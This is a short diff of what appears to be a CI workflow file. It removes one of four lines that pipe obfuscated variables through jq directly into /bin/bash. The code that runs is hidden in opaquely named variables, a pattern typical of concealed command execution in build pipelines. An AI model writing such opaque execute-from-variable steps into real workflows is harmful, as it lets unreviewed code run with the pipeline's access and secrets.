@@ -26,7 +26,6 @@ jobs:
           echo $dxj93 | jq -r .zslf4 | /bin/bash
           printf '%s' "$do75" | jq -r .hfc8942 | /bin/bash
           echo $aam04475 | jq -r .tm7442 | /bin/bash
-          echo $yy23465 | jq -r .xxew19 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
